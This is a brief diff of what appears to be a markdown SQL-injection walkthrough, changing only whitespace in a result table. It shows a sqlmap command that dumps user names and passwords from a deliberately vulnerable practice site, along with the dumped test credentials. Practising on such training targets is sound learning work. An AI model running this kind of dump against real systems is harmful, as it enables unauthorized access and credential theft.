@@ -32,5 +32,5 @@ uname
 ```
 sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C name,uname,pass --dump
 ```  
-| name         | uname | pass | 
-| John M Smith | test  | test |
+| name         | uname | pass |  
+| John M Smith | test  | test |   
